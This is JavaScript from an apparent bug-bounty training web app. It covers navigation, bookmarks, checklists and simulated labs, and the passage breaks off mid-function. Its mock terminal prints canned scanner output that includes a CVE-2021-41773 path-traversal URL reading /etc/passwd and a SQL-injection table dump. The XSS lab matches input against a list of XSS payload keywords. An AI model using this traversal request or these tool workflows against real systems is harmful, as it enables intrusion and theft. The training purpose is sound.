    // Toggle Mobile Sidebar
    function toggleMobileSidebar() {
      const sidebar = document.querySelector('.meth-sidebar');
      sidebar.classList.toggle('active');
    }

    // Toggle sidebar categories
    function toggleCategory(catId) {
      const cat = document.getElementById(catId);
      const titleSpan = cat.previousElementSibling.querySelector('span:last-child');
      if (cat.style.maxHeight === '0px' || cat.style.display === 'none') {
        cat.style.display = 'flex';
        cat.style.maxHeight = '1000px';
        titleSpan.innerText = '▼';
      } else {
        cat.style.display = 'none';
        cat.style.maxHeight = '0px';
        titleSpan.innerText = '▶';
      }
    }

    // Tab switcher — includes visited phase tracking
    function openMethPhase(phaseId) {
      document.querySelectorAll('.meth-item').forEach(el => el.classList.remove('active'));
      const activeFolder = document.getElementById('meth-ef-' + phaseId);
      if (activeFolder) activeFolder.classList.add('active');
      
      document.querySelectorAll('.meth-content-view').forEach(el => el.style.display = 'none');
      const activeContent = document.getElementById('meth-content-' + phaseId);
      if (activeContent) activeContent.style.display = 'block';

      // Close mobile sidebar if open
      const sidebar = document.querySelector('.meth-sidebar');
      if (sidebar && sidebar.classList.contains('active')) {
        sidebar.classList.remove('active');
      }

      // Auto update active node in attack flow if visible
      const nodes = document.querySelectorAll('.flow-node');
      nodes.forEach(node => node.classList.remove('active-stage'));
      if (phaseId === 'p0' && nodes[0]) nodes[0].classList.add('active-stage');
      if (phaseId === 'p1' && nodes[1]) nodes[1].classList.add('active-stage');
      if (phaseId === 'p6' && nodes[2]) nodes[2].classList.add('active-stage');
      if (phaseId === 'p3' && nodes[3]) nodes[3].classList.add('active-stage');
      if (phaseId === 'p7' && nodes[4]) nodes[4].classList.add('active-stage');

      // Track visited phases (progress tracker)
      markVisitedSafe(phaseId);

      // Generate phase TOC and breadcrumb
      // generatePhaseTOC removed
      generateBreadcrumb(phaseId);
    }

    // Switch Vuln Database Tabs
    function switchVulnTab(tabId, btnEl) {
      document.querySelectorAll('.vuln-tab').forEach(t => t.classList.remove('active'));
      document.querySelectorAll('.vuln-pane').forEach(p => p.classList.remove('active'));
      
      if (btnEl) btnEl.classList.add('active');
      const pane = document.getElementById('vuln-' + tabId);
      if (pane) pane.classList.add('active');
    }

    // Copy utility
    function copyText(text, btn) {
      navigator.clipboard.writeText(text).then(() => {
        const originalText = btn.innerText;
        btn.innerText = 'Copied!';
        btn.classList.add('copied');
        setTimeout(() => {
          btn.innerText = originalText;
          btn.classList.remove('copied');
        }, 2000);
      });
    }

    // Node inspector
    function inspectNode(title, desc) {
      let inspector = document.getElementById('recon-inspector');
      let titleEl = document.getElementById('recon-inspector-title');
      let descEl = document.getElementById('recon-inspector-desc');
      
      if (title.startsWith('JS')) {
        inspector = document.getElementById('js-inspector');
        titleEl = document.getElementById('js-inspector-title');
        descEl = document.getElementById('js-inspector-desc');
      } else if (title.startsWith('XSS')) {
        inspector = document.getElementById('xss-inspector');
        titleEl = document.getElementById('xss-inspector-title');
        descEl = document.getElementById('xss-inspector-desc');
      } else if (title.startsWith('SQLi')) {
        inspector = document.getElementById('sqli-inspector');
        titleEl = document.getElementById('sqli-inspector-title');
        descEl = document.getElementById('sqli-inspector-desc');
      } else if (title.startsWith('SSRF')) {
        inspector = document.getElementById('ssrf-inspector');
        titleEl = document.getElementById('ssrf-inspector-title');
        descEl = document.getElementById('ssrf-inspector-desc');
      } else if (title.startsWith('API')) {
        inspector = document.getElementById('api-inspector');
        titleEl = document.getElementById('api-inspector-title');
        descEl = document.getElementById('api-inspector-desc');
      } else if (title.startsWith('GraphQL')) {
        inspector = document.getElementById('graphql-inspector');
        titleEl = document.getElementById('graphql-inspector-title');
        descEl = document.getElementById('graphql-inspector-desc');
      } else if (title.startsWith('JWT')) {
        inspector = document.getElementById('jwt-inspector');
        titleEl = document.getElementById('jwt-inspector-title');
        descEl = document.getElementById('jwt-inspector-desc');
      }

      titleEl.innerText = title;
      descEl.innerText = desc;
      inspector.style.display = 'block';
    }

    // Live Payload filter functions
    function filterPayloads() {
      const query = document.getElementById('payloadSearchInput').value.toLowerCase();
      const activeTabEl = document.querySelector('.vuln-tabs-container .vuln-tab.active');
      const activeTab = activeTabEl ? activeTabEl.id.replace('payload-tab-', '') : 'all';
      
      document.querySelectorAll('.payload-item').forEach(item => {
        const text = item.innerText.toLowerCase();
        const cat = item.getAttribute('data-category');
        
        const matchesQuery = text.includes(query);
        const matchesTab = (activeTab === 'all' || cat === activeTab);
        
        if (matchesQuery && matchesTab) {
          item.style.display = 'block';
        } else {
          item.style.display = 'none';
        }
      });
    }

    function filterPayloadCategory(cat) {
      document.querySelectorAll('.vuln-tabs-container .vuln-tab').forEach(tab => tab.classList.remove('active'));
      document.getElementById('payload-tab-' + cat).classList.add('active');
      filterPayloads();
    }

    // Labs scripts
    function runXSSLab() {
      const val = document.getElementById('xssInput').value;
      const res = document.getElementById('xssResult');
      
      if (val.includes('<script>') || val.includes('onerror') || val.includes('alert') || val.includes('<img') || val.includes('<svg')) {
        res.innerHTML = `<span class="text-neon-red">Search payload reflected: </span> ${val.replace(/</g, "&lt;").replace(/>/g, "&gt;")}`;
        // Trigger alert simulation popup
        document.getElementById('popupModalText').innerText = `Your input payload: "${val}" triggered a script execution environment.`;
        document.getElementById('popupOverlay').style.display = 'block';
        document.getElementById('popupModal').style.display = 'block';
      } else {
        res.innerHTML = `<span class="text-neon-cyan">Search output: </span> No matches found for "${val}"`;
      }
    }

    // Close XSS Modal
    function closePopupModal() {
      document.getElementById('popupOverlay').style.display = 'none';
      document.getElementById('popupModal').style.display = 'none';
    }

    // IDOR Lab
    function runIDORLab() {
      const val = document.getElementById('idorInput').value;
      const res = document.getElementById('idorResult');
      
      if (val == 101) {
        res.innerText = `{
  "status": "success",
  "invoice_id": 101,
  "owner": "Abdo Ramdan",
  "amount": "$0.00 (Self Account)",
  "status": "PAID"
}`;
      } else if (val == 102) {
        res.innerText = `// VULNERABILITY EXPLOITED: IDOR CONFIRMED\n{\n  "status": "success",\n  "invoice_id": 102,\n  "owner": "CEO Administrator",\n  "amount": "$45,000.00 (Private Project)",\n  "status": "UNPAID",\n  "notes": "Sensitive credentials: AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE"\n}`;
      } else if (val == 103) {
        res.innerText = `// VULNERABILITY EXPLOITED: IDOR CONFIRMED\n{\n  "status": "success",\n  "invoice_id": 103,\n  "owner": "John Doe",\n  "amount": "$12.99",\n  "status": "PAID"\n}`;
      } else {
        res.innerText = `{ "status": "error", "message": "Invoice not found or insufficient privileges (Simulated)" }`;
      }
    }

    // Terminal Emulator Scripts
    const termInput = document.getElementById('termInput');
    const termScreen = document.getElementById('termScreen');
    
    if (termInput) {
      termInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
          const cmd = termInput.value.trim();
          termInput.value = '';
          if (cmd) {
            executeTermCmd(cmd);
          }
        }
      });
    }

    function printTermLine(text, colorClass = '') {
      if (!termScreen) return;
      const p = document.createElement('div');
      p.className = 'term-line ' + colorClass;
      p.innerText = text;
      termScreen.appendChild(p);
      termScreen.scrollTop = termScreen.scrollHeight;
    }

    function executeTermCmd(cmd) {
      printTermLine('$ ' + cmd, 'text-neon-cyan');
      
      const args = cmd.toLowerCase().split(' ');
      const main = args[0];

      if (main === 'clear') {
        if (termScreen) termScreen.innerHTML = '';
      } else if (main === 'help') {
        printTermLine('Available simulated commands:\n' +
          '  subfinder -d target.com    - Run subdomain scan\n' +
          '  httpx -l subs.txt           - Check alive targets\n' +
          '  katana -u target.com       - JS Crawling\n' +
          '  ffuf -u target.com/FUZZ    - Directory fuzzing\n' +
          '  nuclei                     - Run CVE scanners\n' +
          '  sqlmap -u target.com/?id=1 - Automated SQL Injection audit\n' +
          '  kiterunner -u target.com   - Fuzz API Endpoints routes\n' +
          '  arjun -u target.com        - Detect hidden query params\n' +
          '  clear                      - Clear the console\n' +
          '  help                       - Show this screen', 'text-secondary');
      } else if (cmd.includes('subfinder')) {
        printTermLine('[info] Starting Subfinder v2.6.2...', 'text-secondary');
        setTimeout(() => printTermLine('[info] Querying 24 passive sources...', 'text-secondary'), 300);
        setTimeout(() => {
          printTermLine('api.target.com\n' +
            'dev.target.com\n' +
            'staging-auth.target.com\n' +
            'admin.target.com\n' +
            'assets.target.com', 'text-neon-green');
          printTermLine('[+] Subfinder finished: 5 subdomains discovered.', 'text-neon-cyan');
        }, 1000);
      } else if (cmd.includes('httpx')) {
        printTermLine('[info] Launching HTTPX checker...', 'text-secondary');
        setTimeout(() => {
          printTermLine('https://api.target.com [200 OK] [Tech: Express, Node.js]\n' +
            'https://admin.target.com [403 Forbidden] [Tech: Apache]\n' +
            'https://dev.target.com [200 OK] [Tech: PHP/8.1, Nginx]\n' +
            'https://staging-auth.target.com [200 OK] [Tech: Next.js]', 'text-neon-green');
          printTermLine('[+] HTTPX check complete. 4 alive hosts found.', 'text-neon-cyan');
        }, 800);
      } else if (cmd.includes('katana')) {
        printTermLine('[info] Initializing crawl engine...', 'text-secondary');
        setTimeout(() => {
          printTermLine('https://target.com/api/v1/auth/login [POST]\n' +
            'https://target.com/assets/app.js [GET]\n' +
            'https://target.com/dashboard/settings [GET]\n' +
            'https://target.com/wp-json/wp/v2/users [GET]', 'text-neon-green');
          printTermLine('[+] Crawling finished successfully.', 'text-neon-cyan');
        }, 1200);
      } else if (cmd.includes('ffuf')) {
        printTermLine(':: FFUF - Fuzz Faster U Fool :: v2.1.0 ::', 'text-secondary');
        printTermLine('________________________________________________', 'text-secondary');
        setTimeout(() => {
          printTermLine('/admin                  [Status: 403, Size: 242]\n' +
            '/config.php.bak         [Status: 200, Size: 4122]  <-- CRITICAL\n' +
            '/robots.txt             [Status: 200, Size: 42]\n' +
            '/phpinfo.php            [Status: 200, Size: 24200]', 'text-neon-green');
          printTermLine('________________________________________________', 'text-secondary');
        }, 1500);
      } else if (cmd.includes('nuclei')) {
        printTermLine('[info] Initializing Nuclei Engine v3.1.2...', 'text-secondary');
        setTimeout(() => {
          printTermLine('[cve-2021-41773] [http] [critical] https://target.com/cgi-bin/%%32%%65/%%32%%65/etc/passwd\n' +
            '[git-core-leak] [http] [high] https://target.com/.git/config\n' +
            '[exposed-panels] [http] [info] https://target.com/admin/login.php', 'text-neon-red');
          printTermLine('[+] Nuclei finished. 1 critical, 1 high alerts detected.', 'text-neon-cyan');
        }, 1800);
      } else if (cmd.includes('sqlmap')) {
        printTermLine('[info] testing connection to the target URL...', 'text-secondary');
        setTimeout(() => {
          printTermLine('[info] heuristic test shows GET parameter id might be vulnerable\n' +
            '[info] testing parameter UNION capability...\n' +
            '[+] GET parameter "id" is vulnerable to UNION-based SQL Injection!', 'text-neon-green');
          printTermLine('Database: target_production_db\n' +
            '[+] Tables found:\n' +
            '  - users\n' +
            '  - transactions\n' +
            '  - admin_credentials', 'text-neon-green');
        }, 1000);
      } else if (cmd.includes('kiterunner') || cmd.includes('kr')) {
        printTermLine('[info] loading API routes database... 2.4M routes loaded.', 'text-secondary');
        setTimeout(() => {
          printTermLine('[+] [200 OK]  GET  /api/v1/user/profile  (Size: 412)\n' +
            '[+] [200 OK]  POST /api/v1/auth/login     (Size: 182)\n' +
            '[+] [403 Forbidden] PUT /api/v1/admin/config (Size: 220)\n' +
            '[+] [200 OK]  GET  /api/v2/invoice/details (Size: 610)', 'text-neon-green');
        }, 1200);
      } else if (cmd.includes('arjun')) {
        printTermLine('[info] Arjun v2.2.1 - Parameter Discovery Tool', 'text-secondary');
        setTimeout(() => {
          printTermLine('[+] Parameter found: "debug" (Type: String)\n' +
            '[+] Parameter found: "role" (Type: String)\n' +
            '[+] Parameter found: "bypass" (Type: Boolean)\n' +
            '[+] Arjun scan complete. 3 parameters discovered.', 'text-neon-green');
        }, 1100);
      } else {
        printTermLine(`Command not found or unsupported in simulation: "${cmd}". Type "help" for a list of available commands.`, 'text-neon-red');
      }
    }

    // Trigger terminal tab and run command simulation
    function triggerTerminalSim(cmd) {
      openMethPhase('p19');
      executeTermCmd(cmd);
    }

    // =============================================
    // PHASE 3: ADVANCED FEATURES
    // =============================================

    // All phases registry for Quick Jump
    const ALL_PHASES = [
      { id: 'p0',        icon: '💻', name: 'Subdomain Enumeration',  cat: 'CORE RECON',        tags: 'subfinder amass httpx naabu nmap katana nuclei' },
      { id: 'p2',        icon: '🖥️', name: 'Tech Detection',         cat: 'CORE RECON',        tags: 'whatweb wappalyzer fingerprinting' },
      { id: 'p1',        icon: '📡', name: 'Port Scanning',           cat: 'CORE RECON',        tags: 'nmap masscan naabu network' },
      { id: 'p_matrix',  icon: '🎯', name: 'Decision Matrix',         cat: 'CORE RECON',        tags: 'strategy attack surface planning' },
      { id: 'p6',        icon: '📂', name: 'Directory Discovery',     cat: 'WEB DISCOVERY',     tags: 'ffuf gobuster dirsearch wordlist' },
      { id: 'p4',        icon: '📜', name: 'JavaScript Recon',        cat: 'WEB DISCOVERY',     tags: 'js secrets endpoints aws keys' },
      { id: 'p16',       icon: '🧬', name: 'APIs & REST Hacking',     cat: 'WEB DISCOVERY',     tags: 'bola idor kiterunner api endpoints' },
      { id: 'p_graphql', icon: '🕸️', name: 'GraphQL Hacking',         cat: 'WEB DISCOVERY',     tags: 'introspection batching bypass shopify' },
      { id: 'p5',        icon: '🎛️', name: 'Parameters Discovery',    cat: 'WEB DISCOVERY',     tags: 'arjun hidden params fuzzing debug' },
      { id: 'p3',        icon: '🕷️', name: 'Crawling & Spidering',    cat: 'WEB DISCOVERY',     tags: 'katana gospider hakrawler crawl' },
      { id: 'p7',        icon: '🌐', name: 'XSS Workflow',            cat: 'VULNERABILITIES',   tags: 'cross site scripting reflected stored dom waf bypass' },
      { id: 'p8',        icon: '💉', name: 'SQLi Workflow',           cat: 'VULNERABILITIES',   tags: 'sql injection union error blind sqlmap' },
      { id: 'p9',        icon: '📡', name: 'SSRF Workflow',           cat: 'VULNERABILITIES',   tags: 'server side request forgery aws metadata cloud' },
      { id: 'p_ssti',    icon: '🧬', name: 'SSTI Workflow',           cat: 'VULNERABILITIES',   tags: 'jinja2 flask rce template injection' },
      { id: 'p_xxe',     icon: '🕸️', name: 'XXE Injection',           cat: 'VULNERABILITIES',   tags: 'xml external entity file read lfi passwd' },
      { id: 'p10',       icon: '🔑', name: 'IDOR Testing',            cat: 'VULNERABILITIES',   tags: 'insecure direct object reference bola horizontal' },
      { id: 'p11',       icon: '📤', name: 'File Upload Exploits',    cat: 'VULNERABILITIES',   tags: 'shell bypass extension magic bytes png' },
      { id: 'p12',       icon: '⚡', name: 'Race Conditions',         cat: 'VULNERABILITIES',   tags: 'concurrent request shopify coupon turbo' },
      { id: 'p14',       icon: '🎫', name: 'JWT Hacking',             cat: 'VULNERABILITIES',   tags: 'token rsa hmac confusion alg none' },
      { id: 'p13',       icon: '🔐', name: 'OAuth & Sessions',        cat: 'VULNERABILITIES',   tags: 'redirect uri hijacking oauth token' },
      { id: 'p15',       icon: '☁️', name: 'Cloud Security',          cat: 'VULNERABILITIES',   tags: 'aws s3 bucket iam privilege escalation' },
      { id: 'p17',       icon: '⚙️', name: 'Automation Pipelines',    cat: 'PIPELINES & LABS',  tags: 'bash scripting oneliners bug bounty automation' },
      { id: 'p_payloads',icon: '📋', name: 'Searchable Payloads',     cat: 'PIPELINES & LABS',  tags: 'xss sqli rce wordlist cheatsheet' },
      { id: 'p18',       icon: '🧪', name: 'Interactive Labs',        cat: 'PIPELINES & LABS',  tags: 'xss idor hands on practice lab' },
      { id: 'p_writeups',icon: '📜', name: 'Real Writeups',           cat: 'PIPELINES & LABS',  tags: 'bug bounty reports hackerone writeups' },
      { id: 'p19',       icon: '🐚', name: 'Simulated Shell',         cat: 'PIPELINES & LABS',  tags: 'terminal emulator bash command line' },
          { id: 'p_scen_rce',     icon: '💥', name: 'LFI to RCE Scenario',      cat: 'HACKER SCENARIOS',  tags: 'scenario rce remote code execution lfi log poisoning' },
      { id: 'p_scen_idor',    icon: '🔑', name: 'IDOR Admin Takeover',       cat: 'HACKER SCENARIOS',  tags: 'scenario idor access control api parameter tampering' },
      { id: 'p_scen_takeover',icon: '🏳️', name: 'Subdomain Takeover',         cat: 'HACKER SCENARIOS',  tags: 'scenario subdomain takeover cname dns hijacking github pages' },
    ];
    const TOTAL_PHASES = ALL_PHASES.length;

    // ---- VISITED PHASES (Progress Tracker) ----
    let visitedPhases = new Set(JSON.parse(localStorage.getItem('meth_visited') || '[]'));

    function markVisited(phaseId) {
      visitedPhases.add(phaseId);
      localStorage.setItem('meth_visited', JSON.stringify([...visitedPhases]));
      const item = document.getElementById('meth-ef-' + phaseId);
      if (item) item.classList.add('visited');
      updateProgressBar();
    }

    function updateProgressBar() {
      const count = visitedPhases.size;
      const pct = Math.round((count / TOTAL_PHASES) * 100);
      const fill = document.getElementById('progressBarFill');
      const label = document.getElementById('progressCount');
      if (fill) fill.style.width = pct + '%';
      if (label) label.textContent = count + ' / ' + TOTAL_PHASES;
    }

    // markVisitedSafe: safe version that doesn't conflict with openMethPhase
    function markVisitedSafe(phaseId) {
      markVisited(phaseId);
    }

    // Restore visited badges on load
    function restoreVisited() {
      visitedPhases.forEach(id => {
        const item = document.getElementById('meth-ef-' + id);
        if (item) item.classList.add('visited');
      });
      updateProgressBar();
    }

    // ---- BOOKMARK SYSTEM ----
    let bookmarks = JSON.parse(localStorage.getItem('meth_bookmarks') || '[]');

    function toggleBookmark(e, phaseId, name) {
      e.stopPropagation();
      const btn = e.currentTarget;
      const idx = bookmarks.findIndex(b => b.id === phaseId);
      if (idx === -1) {
        bookmarks.push({ id: phaseId, name });
        btn.classList.add('bookmarked');
      } else {
        bookmarks.splice(idx, 1);
        btn.classList.remove('bookmarked');
      }
      localStorage.setItem('meth_bookmarks', JSON.stringify(bookmarks));
      renderBookmarksPanel();
    }

    function renderBookmarksPanel() {
      const panel = document.getElementById('bookmarksPanel');
      const list  = document.getElementById('bookmarksList');
      const count = document.getElementById('bookmarkCount');
      if (!panel || !list || !count) return;

      count.textContent = bookmarks.length;

      if (bookmarks.length === 0) {
        panel.classList.remove('has-items');
        list.innerHTML = '';
        return;
      }
      panel.classList.add('has-items');

      list.innerHTML = bookmarks.map(b => `
        <div class="bookmark-item-entry" onclick="openMethPhase('${b.id}')">
          <span>★</span> <span>${b.name}</span>
        </div>
      `).join('');

      // Sync bookmark buttons state
      document.querySelectorAll('.bookmark-btn').forEach(btn => btn.classList.remove('bookmarked'));
      bookmarks.forEach(b => {
        const item = document.getElementById('meth-ef-' + b.id);
        if (item) {
          const btn = item.querySelector('.bookmark-btn');
          if (btn) btn.classList.add('bookmarked');
        }
      });
    }

    function toggleBookmarksPanel() {
      const list = document.getElementById('bookmarksList');
      if (list) list.style.display = list.style.display === 'none' ? 'flex' : 'none';
    }

    // ---- SIDEBAR SEARCH FILTER ----
    function filterSidebarItems(query) {
      const q = query.toLowerCase().trim();
      const noResults = document.getElementById('searchNoResults');
      let anyVisible = false;

      document.querySelectorAll('.meth-item').forEach(item => {
        const name   = (item.querySelector('span:nth-child(2)')?.textContent || '').toLowerCase();
        const tags   = (item.getAttribute('data-search') || '').toLowerCase();
        const match  = !q || name.includes(q) || tags.includes(q);
        item.style.display = match ? '' : 'none';
        if (match) anyVisible = true;
      });

      // Show/hide categories depending on whether children are visible
      document.querySelectorAll('.sidebar-category').forEach(cat => {
        const items = cat.querySelectorAll('.meth-item');
        const hasVisible = [...items].some(i => i.style.display !== 'none');
        cat.style.display = hasVisible ? '' : 'none';
        // Auto-expand categories when searching
        if (q) {
          const catItems = cat.querySelector('.category-items');
          if (catItems && hasVisible) catItems.style.maxHeight = '';
        }
      });

      if (noResults) noResults.style.display = anyVisible ? 'none' : 'block';
    }

    // ---- QUICK JUMP MODAL (Ctrl+K) ----
    let qjSelectedIdx = -1;

    function openQuickJump() {
      const overlay = document.getElementById('quickJumpOverlay');
      const input   = document.getElementById('quickJumpInput');
      if (!overlay || !input) return;
      overlay.style.display = 'block';
      input.value = '';
      qjSelectedIdx = -1;
      renderQuickJumpResults('');
      setTimeout(() => input.focus(), 50);
    }

    function closeQuickJump(e) {
      if (e && e.target !== document.getElementById('quickJumpOverlay')) return;
      const overlay = document.getElementById('quickJumpOverlay');
      if (overlay) overlay.style.display = 'none';
    }

    function renderQuickJumpResults(q) {
      const container = document.getElementById('quickJumpResults');
      if (!container) return;
      const query = q.toLowerCase().trim();

      const filtered = !query
        ? ALL_PHASES
        : ALL_PHASES.filter(p =>
            p.name.toLowerCase().includes(query) ||
            p.tags.toLowerCase().includes(query) ||
            p.cat.toLowerCase().includes(query)
          );

      if (filtered.length === 0) {
        container.innerHTML = `<div class="quick-jump-no-results">No results for "${q}"</div>`;
        qjSelectedIdx = -1;
        return;
      }

      container.innerHTML = filtered.map((p, i) => `
        <div class="quick-jump-result-item ${i === qjSelectedIdx ? 'selected' : ''} ${query && p.name.toLowerCase().includes(query) ? 'match-highlight' : ''}"
             onclick="selectQuickJump('${p.id}')"
             data-phase="${p.id}">
          <span class="item-icon">${p.icon}</span>
          <span class="item-name">${p.name}</span>
          <span class="item-cat">${p.cat}</span>
        </div>
      `).join('');
    }

    function selectQuickJump(phaseId) {
      openMethPhase(phaseId);
      const overlay = document.getElementById('quickJumpOverlay');
      if (overlay) overlay.style.display = 'none';
    }

    // Quick Jump input handler
    const qjInput = document.getElementById('quickJumpInput');
    if (qjInput) {
      qjInput.addEventListener('input', function() {
        qjSelectedIdx = -1;
        renderQuickJumpResults(this.value);
      });

      qjInput.addEventListener('keydown', function(e) {
        const items = document.querySelectorAll('.quick-jump-result-item[data-phase]');
        if (!items.length) return;

        if (e.key === 'ArrowDown') {
          e.preventDefault();
          qjSelectedIdx = Math.min(qjSelectedIdx + 1, items.length - 1);
          items.forEach((el, i) => el.classList.toggle('selected', i === qjSelectedIdx));
          items[qjSelectedIdx]?.scrollIntoView({ block: 'nearest' });
        } else if (e.key === 'ArrowUp') {
          e.preventDefault();
          qjSelectedIdx = Math.max(qjSelectedIdx - 1, 0);
          items.forEach((el, i) => el.classList.toggle('selected', i === qjSelectedIdx));
          items[qjSelectedIdx]?.scrollIntoView({ block: 'nearest' });
        } else if (e.key === 'Enter') {
          e.preventDefault();
          const selected = items[qjSelectedIdx] || items[0];
          if (selected) selectQuickJump(selected.getAttribute('data-phase'));
        } else if (e.key === 'Escape') {
          const overlay = document.getElementById('quickJumpOverlay');
          if (overlay) overlay.style.display = 'none';
        }
      });
    }

    // ---- GLOBAL KEYBOARD SHORTCUTS ----
    document.addEventListener('keydown', function(e) {
      // Ctrl+K = Open Quick Jump
      if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
        e.preventDefault();
        openQuickJump();
      }
      // ESC = Close Quick Jump
      if (e.key === 'Escape') {
        const overlay = document.getElementById('quickJumpOverlay');
        if (overlay && overlay.style.display === 'block') {
          overlay.style.display = 'none';
        }
      }
      // / = Focus sidebar search
      if (e.key === '/' && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'TEXTAREA') {
        e.preventDefault();
        const search = document.getElementById('sidebarSearch');
        if (search) search.focus();
      }
    });

    // ── Light/Dark Theme Switcher (Phase 2) ──
    function toggleTheme() {
      const isLight = document.body.classList.toggle('light-theme');
      localStorage.setItem('theme_preference', isLight ? 'light' : 'dark');
      const toggleBtn = document.getElementById('themeToggleBtn');
      if (toggleBtn) toggleBtn.textContent = isLight ? '☀️' : '🌙';
    }
    
    function initTheme() {
      const savedTheme = localStorage.getItem('theme_preference');
      const systemPrefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
      const isLight = savedTheme === 'light' || (!savedTheme && systemPrefersLight);
      
      if (isLight) {
        document.body.classList.add('light-theme');
        const toggleBtn = document.getElementById('themeToggleBtn');
        if (toggleBtn) toggleBtn.textContent = '☀️';
      }
    }

    // ── Auto Table of Contents for Phase 0 (Phase 2) ──
    function generateTOC() {
      const p0Container = document.getElementById('meth-content-p0');
      if (!p0Container) return;
      
      const cards = p0Container.querySelectorAll('.cyber-card.mobile-accordion');
      const tocItems = [];
      
      cards.forEach((card, idx) => {
        const header = card.querySelector('.card-header h3');
        if (header) {
          const cardId = `p0-card-${idx}`;
          card.id = cardId;
          const title = header.textContent.replace(/^[^\w\s\u0600-\u06FF]+/g, '').trim();
          tocItems.push({ id: cardId, title });
        }
      });
      
      if (tocItems.length > 0) {
        const tocBox = document.createElement('div');
        tocBox.className = 'toc-box';
        tocBox.innerHTML = `
          <div class="toc-title">📋 Table of Contents</div>
          <div class="toc-links">
            ${tocItems.map(item => `<span class="toc-link-item" onclick="document.getElementById('${item.id}').scrollIntoView({ behavior: 'smooth' })">• ${item.title}</span>`).join('')}
          </div>
        `;
        const hero = p0Container.querySelector('.cyber-hero');
        if (hero) {
          hero.parentNode.insertBefore(tocBox, hero.nextSibling);
        }
      }
    }

    // ── Dynamic Metadata & Breadcrumbs (Phase 2) ──
    function renderTacticsMetadata() {
      const views = document.querySelectorAll('.meth-content-view');
      const difficultyMap = {
        'p0': { read: '15 min', level: 'Intermediate', tool: 'Recon' },
        'p2': { read: '5 min', level: 'Beginner', tool: 'Fingerprint' },
        'p1': { read: '8 min', level: 'Beginner', tool: 'Port Scan' },
        'p_matrix': { read: '5 min', level: 'Intermediate', tool: 'Strategy' },
        'p6': { read: '10 min', level: 'Intermediate', tool: 'Fuzzing' },
        'p4': { read: '12 min', level: 'Advanced', tool: 'JS Analysis' },
        'p_writeups': { read: '25 min', level: 'Intermediate', tool: 'Reports' },
        'p19': { read: '5 min', level: 'Beginner', tool: 'CLI Terminal' }
      };

      views.forEach(view => {
        const hero = view.querySelector('.cyber-hero');
        if (hero) {
          const id = view.id.replace('meth-content-', '');
          const meta = difficultyMap[id] || { read: '8 min', level: 'Intermediate', tool: 'Exploit' };
          
          const metaBox = document.createElement('div');
          metaBox.className = 'meta-header-box';
          metaBox.innerHTML = `
            <span class="meta-badge">⏱ ${meta.read} read</span>
            <span class="meta-badge">📖 ${meta.level}</span>
            <span class="meta-badge">🛠 ${meta.tool}</span>
          `;
          hero.appendChild(metaBox);
        }
      });
    }

    function renderBreadcrumbs() {
      const views = document.querySelectorAll('.meth-content-view');
      views.forEach(view => {
        const hero = view.querySelector('.cyber-hero');
        if (hero) {
          const title = hero.querySelector('.hero-title')?.textContent || 'Details';
          const breadBox = document.createElement('div');
          breadBox.className = 'breadcrumb-box';
          breadBox.innerHTML = `
            <span>Playbook</span>
            <span class="breadcrumb-separator">&gt;</span>
            <span>Academy</span>
            <span class="breadcrumb-separator">&gt;</span>
            <span class="text-neon-cyan">${title}</span>
          `;
          hero.parentNode.insertBefore(breadBox, hero);
        }
      });
    }

    // Close sidebar when clicking outside on mobile
    document.addEventListener('click', function(event) {
      const sidebar = document.querySelector('.meth-sidebar');
      const toggleBtn = document.querySelector('.menu-toggle-btn');
      if (window.innerWidth <= 900 && sidebar && sidebar.classList.contains('active')) {
        if (!sidebar.contains(event.target) && !toggleBtn.contains(event.target)) {
          sidebar.classList.remove('active');
        }
      }
    });

    // Toggle expanded state of mobile accordions
    document.addEventListener('click', function(e) {
      if (window.innerWidth <= 768) {
        const header = e.target.closest('.cyber-card.mobile-accordion .card-header');
        if (header) {
          const card = header.closest('.cyber-card');
          if (card) {
            card.classList.toggle('expanded');
          }
        }
      }
    });


    // =============================================
    // BUG BOUNTY OPERATING SYSTEM — Core Engine
    // =============================================

    // Decision Tree — Real Yes/No Branching
    function dtBranch(showId, hideId) {
      const showEl = document.getElementById(showId);
      const hideEl = hideId ? document.getElementById(hideId) : null;
      if (!showEl) return;
      const isOpen = showEl.classList.contains('show');
      if (isOpen) {
        showEl.classList.remove('show');
        showEl.style.display = 'none';
      } else {
        showEl.classList.add('show');
        showEl.style.display = 'block';
        if (hideEl) {
          hideEl.classList.remove('show');
          hideEl.style.display = 'none';
        }
      }
    }

    // ---- CHECKLISTS — Persistent localStorage ----
    function toggleCheck(item, phaseId, index) {
      item.classList.toggle('checked');
      const isChecked = item.classList.contains('checked');
      localStorage.setItem('bb_check_' + phaseId + '_' + index, isChecked ? '1' : '0');
      updateChecklistProgress(phaseId);
      
      if (isChecked && typeof addGamiXP === 'function') {
        addGamiXP(10, phaseId); // Add 10 XP and check badges
      }
    }

    function updateChecklistProgress(phaseId) {
      const list = document.getElementById('checklist-' + phaseId);
      if (!list) return;
      const items = list.querySelectorAll('.checklist-item');
      const checked = list.querySelectorAll('.checklist-item.checked').length;
      const total = items.length;
      const pct = total > 0 ? Math.round((checked / total) * 100) : 0;
      const countEl = document.getElementById(phaseId + '-checklist-count');
      const barEl = document.getElementById(phaseId + '-checklist-bar');
      if (countEl) countEl.textContent = checked + ' / ' + total + ' completed';
      if (barEl) barEl.style.width = pct + '%';
    }

    function loadChecklistState(phaseId, count) {
      for (let i = 0; i < count; i++) {
        const saved = localStorage.getItem('bb_check_' + phaseId + '_' + i);
        if (saved === '1') {
          const list = document.getElementById('checklist-' + phaseId);
          if (!list) continue;
          const items = list.querySelectorAll('.checklist-item');
          if (items[i]) items[i].classList.add('checked');
        }
      }
      updateChecklistProgress(phaseId);
    }

    // ---- MARK PHASE COMPLETE ----
    function markPhaseComplete(phaseId, nextPhaseId) {
      const btn = document.getElementById('complete-btn-' + phaseId);
      if (btn) {
        btn.classList.add('completed');
        btn.innerHTML = '✅ Phase Completed! Navigating...';
        btn.disabled = true;
      }
      localStorage.setItem('bb_phase_done_' + phaseId, '1');

      // Update hunt session
      const session = JSON.parse(localStorage.getItem('bb_hunt_session') || 'null');
      if (session) {
        if (!session.completedPhases) session.completedPhases = [];
        if (!session.completedPhases.includes(phaseId)) {
          session.completedPhases.push(phaseId);
        }
        localStorage.setItem('bb_hunt_session', JSON.stringify(session));
        updateHuntDashboard();
      }

      setTimeout(function() { openMethPhase(nextPhaseId); }, 700);
